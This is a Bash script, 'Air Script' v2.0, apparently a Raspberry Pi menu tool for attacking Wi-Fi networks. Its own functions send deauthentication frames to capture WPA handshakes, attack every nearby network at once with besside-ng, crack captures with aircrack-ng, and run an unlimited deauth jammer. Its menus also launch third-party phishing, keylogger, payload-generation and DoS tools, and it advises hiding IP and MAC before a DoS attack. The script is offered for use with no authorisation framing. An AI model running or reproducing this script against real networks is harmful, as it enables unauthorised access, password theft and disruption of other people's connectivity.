#!/bin/bash


# Ensure we are being ran as root
if [ $(id -u) -ne 0 ]; then
	echo "This script must be ran as root"
	exit 1
fi
network () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
airmon-ng start $foo
echo "Please, select the interface in monitor mode:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
cd /home/*/air-script
}
chmod -R 755 *
sudo postfix start> /dev/null 2>&1
clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
apt-get install -y aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if $foo is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}$foo${White}] Enabled!"
fi
}


checkServices () {
sudo systemctl start postfix 
sudo systemctl start ssh 

}

banner () {        ##### Banner #####
echo -e "${Red}




 ▄▄▄       ██▓ ██▀███                            
▒████▄    ▓██▒▓██ ▒ ██▒                          
▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒                          
░██▄▄▄▄██ ░██░▒██▀▀█▄                            
 ▓█   ▓██▒░██░░██▓ ▒██▒                          
 ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░                          
  ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░                          
  ░   ▒    ▒ ░  ░░   ░                           
      ░  ░ ░     ░                               
                                                 
  ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░   
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░    
░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      
      ░  ░ ░         ░      ░                    
         ░                                  "
echo -e "${Yellow} \n             Hack the world!!!     "
echo -e "${Green}\n                    Developed by: Liam Bendix"
echo -e "${Green}                         Version: 2.0 Stable"
}

menu () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Passowrd(s)"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change IP Address"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}View log file"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Extra Tools"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Help"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Passowrd(s).."
     crack
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
     wifiJammer
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
     macChange
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
     anonsurf
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
     log
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
     tools
     exit 0
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
     Help
     exit 0
     ;;
  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

wifiHacking () {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifite Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifite2 Attacks"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Wifiphisher Attacks"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Fern Attacks"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Airogeddon Attacks"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
     AirScriptMenu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
     FluxionMenu
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifite.."
     Wifite
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifite2.."
     Wifite2
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Wifiphisher.."
     StartWifiphisher
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 Fern.."
     Fern
     exit 0
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Airgeddon.."
     airogeddon
     exit 0
     ;;
  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


 AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
     AirScript
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
     attackAll
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
     crack
     exit 0
     ;;
  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}



AirScript() {
notification
}


notification () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackYes; break;;
        [Nn]* ) attackNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackYes () {
echo "Enter your email address for notifications: " email
read email
echo "Remember to check your spam folder!"
sleep 3
network
PiScan
monitor
sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
sudo aireplay-ng --deauth 20 -a $bssid $foo
sudo chmod -R 755 *
sudo airmon-ng stop $foo
sudo ifconfig $foo up
sudo systemctl start NetworkManager
checkServices 
sleep 10
sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP* "
crack
}


attackNo () {
network
PiScan
monitor
sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
#sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 11 --output-format pcap --write handshake $foo > /dev/null &
echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
sudo aireplay-ng --deauth 20 -a $bssid $foo
#sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 $foo
sudo chmod -R 755 air-script
sudo airmon-ng stop $foo
sudo ifconfig $foo up
sudo systemctl start NetworkManager
checkServices 
crack

}









notification1 () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackAllYes; break;;
        [Nn]* ) attackAllNo;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackAll() {
notification1
}



attackAllYes () {
echo "Enter your email address for notifications: " email
read email
sleep 3
echo "Remeber to check your spam folder!"
network
PiPwn
sudo besside-ng $foo
stopMon
sudo ifconfig $foo up
sudo systemctl start NetworkManager
sudo chmod -R 755 air-crack
checkservices
sleep 10
sendemail -f airscript@gmail.com -t $email -u "Air Script is done pwning!" -m "Pwn complete, ready for you to crack. This is a robot please do not reply. *BEEP BOOP*"
crack
}


attackAllNo () {
network
PiPwn
sudo besside-ng $foo
stopMon
sudo ifconfig $foo up
sudo systemctl start NetworkManager
sudo chmod -R 755 air-crack
echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
checkservices
crack
}

PiScan () {
echo "$(tput setaf 2)
   .~~.   .~~.
  '. \ ' ' / .'$(tput setaf 1)
   .~ .~~~..~.
  : .~.'~'.~. :
 ~ (   ) (   ) ~
( : '~'.~.'~' : )
 ~ .~ (   ) ~. ~
  (  : '~' :  ) $(tput sgr0)Raspberry Pi is scanning..$(tput setaf 1)
   '~ .~~~. ~'  $(tput sgr0)Please wait!$(tput setaf 1)
       '~'
$(tput sgr0)"

}



PiPwn () {
echo "$(tput setaf 2)
   .~~.   .~~.
  '. \ ' ' / .'$(tput setaf 1)
   .~ .~~~..~.
  : .~.'~'.~. :
 ~ (   ) (   ) ~
( : '~'.~.'~' : )
 ~ .~ (   ) ~. ~
  (  : '~' :  ) $(tput sgr0)Raspberry Pi is attacking..$(tput setaf 1)
   '~ .~~~. ~'  $(tput sgr0)Please wait!$(tput setaf 1)
       '~'
$(tput sgr0)"

}



FluxionMenu() {
cd /bin/air-script/tools
cd fluxion
sudo ./fluxion.sh
}

Wifite () {
sudo wifite
}

Wifite2 () {
cd /bin/air-script/tools
cd wifite2
sudo ./Wifite.py
}

crack() {
echo "Your current directory:"
pwd
ls
read -p "Enter path to wordlist : " wordlist
 $wordlist
sudo aircrack-ng -w $wordlist *.cap
#sudo aircrack-ng -w $wordlist wep.cap
#sudo aircrack-ng -w $wordlist wpa.cap
#sudo aircrack-ng -w wordlist.txt wep.cap
#sudo aircrack-ng -w wordlist.txt wpa.cap
#sudo aircrack-ng -w wordlist.txt *.cap
}

StartWifiphisher () {
wifiphisher

}

Fern () {
sudo fern-wifi-cracker
}


airogeddon () {
cd /bin/air-script/tools
cd airgeddon
sudo bash airgeddon.sh
}


wifiJammer () {        ##### Sending unlimited DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel $foo > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
}

monitor () {        ##### Monitor mode, scan available networks & select target #####
spinner &
airmon-ng start $foo > /dev/null
trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
airodump-ng --output-format kismet --write generated $foo > /dev/null & sleep 20 ; kill $!
sed -i '1d' generated-01.kismet.csv
kill %1
airmon-ng stop $foo
echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
targetNumber=1000
while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber
done
airmon-ng start $foo
targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
rm generated-01.kismet.csv 2> /dev/null
echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}


networkselect () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done

}


macChange() {
     ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Change MAC Address"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Restore Original MAC Address"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Show Current MAC Address"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Changing MAC Address..."
     spoofMAC
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Restore MAC Address.."
     RestoreMAC
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Current MAC Address.."
     showMAC
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


spoofMAC(){
networkselect
macchanger -s $foo
sudo ifconfig $foo down
sudo macchanger -r $foo
sudo ifconfig $foo up
macchanger -s $foo
}

RestoreMAC(){
networkselect
sudo ifconfig $foo down
sudo macchanger -p $foo
sudo ifconfig $foo up
sudo macchanger -s $foo

}

showMAC() {
networkselect
macchanger -s $foo



}





anonsurf (){ 
       ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Start Anonsurf"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Show Anonsurf Status"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Stop Anonsurf"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Restart Anonsurf"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change TOR Identity"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Start i2p Services"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Stop i2p Services"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Show Current IP Address"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Start Anonsurf"
     anonsurfStart
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Show Anonsurf Status"
     anonsurfStatus
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Stop Anonsurf"
     anonsurfStop
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Restart Anonsurf"
     anonsurfRestart
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Changeing Identity Restarting TOR"
     anonsurfChange
     exit 0
     ;; 
  6) echo -e "\n[${Green}Selected${White}] Start i2p Services"
     anonsurfStarti2p
     exit 0
     ;; 
  7) echo -e "\n[${Green}Selected${White}] Stop i2p Services"
     anonsurfStopi2p
     exit 0
     ;; 
  8) echo -e "\n[${Green}Selected${White}] Show your current IP address"
     anonip
     exit 0
     ;; 
  9) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


anonsurfStart(){
sudo anonsurf start
}

anonsurfStatus(){
sudo anonsurf status
}


anonsurfStop(){
sudo anonsurf stop
}

anonsurfRestart(){
sudo anonsurf restart
}

anonsurfChange(){
sudo anonsurf change
}

anonsurfStarti2p(){
sudo anonsurf starti2p
}
anonsurfStopi2p(){
sudo anonsurf stopi2p
}

anonip(){
sudo anonsurf myip
}





      tools () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Zirikatu"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Routersploit"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Zatacker"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Morpheus"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Hakku"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Trity"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Cupp"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Dracnmap"
echo -e "      ${Red}[${Blue}9${Red}] ${Green}KickThemOut"
echo -e "      ${Red}[${Blue}10${Red}] ${Green}Ghost-Phisher"
echo -e "      ${Red}[${Blue}11${Red}] ${Green}Xerxes"
echo -e "      ${Red}[${Blue}12${Red}] ${Green}Katana"
echo -e "      ${Red}[${Blue}13${Red}] ${Green}Websploit"
echo -e "      ${Red}[${Blue}14${Red}] ${Green}BeeLogger"
echo -e "      ${Red}[${Blue}15${Red}] ${Green}Ezsploit"
echo -e "      ${Red}[${Blue}16${Red}] ${Green}TheFatRat"
echo -e "      ${Red}[${Blue}17${Red}] ${Green}Angry IP Scanner"
echo -e "      ${Red}[${Blue}18${Red}] ${Green}Sn1per"
echo -e "      ${Red}[${Blue}19${Red}] ${Green}Red Hawk"
echo -e "      ${Red}[${Blue}20${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Zirikaru"
  zirikatu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Routersploit"
  routersploit
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Zatacker"
  Zatacker
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Morpheus"
  morpheus
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Hakku"
  Hakku
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 Trity"
  Trity
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Cupp"
  Cupp
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Dracnmap"
  dracnmap
     ;;
  9) echo -e "\n[${Green}Selected${White}] Option 9 KickThemOut"
  kickthemout
     ;;
  10) echo -e "\n[${Green}Selected${White}] Option 10 Ghost-Phisher"
  ghostPhisher
     ;;
  11) echo -e "\n[${Green}Selected${White}] Option 11 Xerxes"
  Xerxes
     ;;
  12) echo -e "\n[${Green}Selected${White}] Option 12 Katana"
  Katana
     ;;
  13) echo -e "\n[${Green}Selected${White}] Option 13 Websploit"
  websploit
     ;;
  14) echo -e "\n[${Green}Selected${White}] Option 13 Websploit"
  BeeLogger
     ;;
  15) echo -e "\n[${Green}Selected${White}] Option 15 Ezsploit"
  Ezsploit
     ;;
  16) echo -e "\n[${Green}Selected${White}] Option 16 TheFatRat"
  TheFatRat
     ;;
  17) echo -e "\n[${Green}Selected${White}] Option 17 Angry IP Scanner"
  AngryIpScanner
     ;;
  18) echo -e "\n[${Green}Selected${White}] Option 18 Sn1per"
  Sn1per
  exit 0
     ;;
  19) echo -e "\n[${Green}Selected${White}] Option 19 Red Hawk"
  redhawk
  exit 0
     ;;
  20) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


zirikatu () {
cd /bin/air-script/tools
cd zirikatu
sudo ./zirikatu.sh

}

routersploit () {
cd /bin/air-script/tools
cd routersploit
python3 rsf.py

}

Zatacker () {
cd /bin/air-script/tools
cd Zatacker
./ZT.sh
}

morpheus () {
cd /bin/air-script/tools
cd morpheus
sudo ./morpheus.sh
}

Hakku () {
cd /bin/air-script/tools
cd hakkuframework
./hakku

}

Trity () {
trity

}

Cupp () {
cd /bin/air-script/tools
cd cupp
python3 cupp.py -i
}

dracnmap () {
cd /bin/air-script/tools
cd Dracnmap
chmod +x dracnmap-v2.2.sh
sudo ./dracnmap-v2.2.sh

}

kickthemout () {
cd /bin/air-script/tools
cd kickthemout
sudo python3 kickthemout.py

}


ghostPhisher () {
cd /bin/air-script/tools
cd ghost-phisher
cd Ghost-Phisher
chmod +x ghost.py
sudo ./ghost.py
}


Xerxes () {
cd /bin/air-script/tools
cd XERXES
echo "Xerxes DoS Attack"
sleep 3
echo "Remeber to hide your IP and MAC"
sleep 3
read -p "Enter the IP & Port of target (e.g. 102.102.102.102:80) : " ip
sudo ./xerxes $ip

}


Katana () {
cd /bin/air-script/tools
cd KatanaFramework
sudo ./ktf.run
sudo ./ktf.run -h
echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
  
}

websploit () {
sudo websploit
}



BeeLogger () {
cd /bin/air-script/tools
cd BeeLogger
sudo python bee.py
}


ezsploit () {
cd /bin/air-script/tools
cd ezsploit
sudo ./ezploit.sh


}

TheFatRat () {
sudo fatrat

}

AngryIpScanner () {
sudo sh /usr/bin/ipscan
}


Sn1per () {
cd /bin/air-script/tools
cd Sn1per
sudo sniper

}


redhawk () {
cd /bin/air-script/tools
cd RED_HAWK
php rhawk.php

}

Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up for mobile"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Its not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Turn off monitor mode"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Uninstall"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Clean"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up mobile?"
     instructions
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Fixing monitor mode.."
     stopMon
     exit 0
     ;; 
  4) echo -e "\n[${Green}Selected${White}] Running uninstall tool.."
    uninstall
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Cleaning captured handshakes.."
    clean
     exit 0
     ;; 
  5) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


clean () {
sudo rm -r *cap> /dev/null 2>&1
sudo rm -r ipscan_3.7.6_all.deb> /dev/null 2>&1
}

uninstall () {
sudo ./uninstall.sh 
}

stopMon () {
sudo airmon-ng stop wlan0mon > /dev/null 2>&1
sudo airmon-ng stop wlan1mon > /dev/null 2>&1
sudo airmon-ng stop wlan2mon > /dev/null 2>&1
sudo airmon-ng stop wlan3mon > /dev/null 2>&1
sudo airmon-ng stop wlan4mon > /dev/null 2>&1
sudo airmon-ng stop wlan5mon > /dev/null 2>&1
sudo airmon-ng stop wlan7mon > /dev/null 2>&1
sudo airmon-ng stop wlan8mon > /dev/null 2>&1
sudo airmon-ng stop wlan9mon > /dev/null 2>&1
sudo airmon-ng stop wlan10mon > /dev/null 2>&1
sudo service network-mamager start > /dev/null 2>&1
sudo service network-mamager restart > /dev/null 2>&1
sudo ifconfig wlan0 up > /dev/null 2>&1
sudo ifconfig wlan1 up > /dev/null 2>&1
sudo ifconfig wlan2 up > /dev/null 2>&1
sudo ifconfig wlan3 up > /dev/null 2>&1
sudo ifconfig wlan4 up > /dev/null 2>&1
sudo ifconfig wlan6 up > /dev/null 2>&1
sudo ifconfig wlan7 up > /dev/null 2>&1
sudo ifconfig wlan8 up > /dev/null 2>&1
sudo ifconfig wlan9 up > /dev/null 2>&1
sudo ifconfig wlan10 up > /dev/null 2>&1


sudo wpa_suplicant > /dev/null 2>&1

}




instructions(){

echo "$(tput setaf 2)INSTRUCTIONS:

METHOD 1: (SSH/AD HOC METHOD)

Step 1: Once established connection to Pi via Hotspot or Ad Hoc
run command "sudo ./air-script.sh"
Step 2: Select an attack
--------------------------------------------------

METHOD 2:

With Raspberry Pi using screen, mouse and keyboard:
You can use method one, without the need of SSH or Ad Hoc. "
}

fix(){
echo "$(tput setaf 2)Attempting to fix! Please wait..."
./install.sh

}



log(){
cat besside.log
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}$foo${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}$foo${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

targeted () {
checkDependencies
checkWiFiStatus
banner
menu
checkServices 
}

targeted



